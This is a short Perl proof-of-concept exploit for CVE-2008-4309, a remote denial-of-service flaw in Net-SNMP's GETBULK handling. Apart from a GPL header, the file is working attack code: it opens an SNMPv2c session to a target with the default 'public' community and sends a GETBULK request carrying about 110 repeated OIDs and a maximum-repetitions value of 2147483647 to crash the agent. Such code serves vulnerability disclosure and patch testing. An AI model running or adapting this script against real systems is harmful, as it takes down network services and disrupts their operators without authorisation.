#!/usr/bin/perl
#
#   Copyright (C) 2008  Hugo Oliveira Dias - hdias [at] synchlabs.com
#
#   Net-SNMP GETBULK Remote Denial of Service Vulnerability
#   BugTraq ID: 32020 - CVE-2008-4309
#
#		http://www.synchlabs.com/vulns/CVE-2008-4309.htm
#
#   Proof of Concept - Tested on Fedora Core 9 - net-snmp-5.4.1-14.fc9
#
#   This program is free software: you can redistribute it and/or
#   modify it under the terms of the GNU General Public License as
#   published by the Free Software Foundation, either version 3 of the
#   License, or (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program. If not, see <http://www.gnu.org/licenses/>.


use strict;
use Net::SNMP qw(:snmp);

my ($session, $error) = Net::SNMP->session(
   -hostname    => shift || '192.168.0.10',
   -community   => shift || 'public',
   -port        => shift || 161,
   -version     => 'snmpv2c',
   -nonblocking => 1
);

if (!defined($session)) {
   printf("ERROR: %s.\n", $error);
   exit 1;
}

my $oid = '1.3';

$session->get_bulk_request(
   -varbindlist    => [$oid,$oid,$oid,$oid,$oid,
$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,
$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,
$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,
$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,
$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,
$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,
$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,
$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,
$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,
$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,$oid,
$oid,$oid,$oid,$oid,$oid
],
   -maxrepetitions  => 2147483647,
   -nonrepeaters    => 0,
);

snmp_dispatcher();

$session->close;

exit 0;
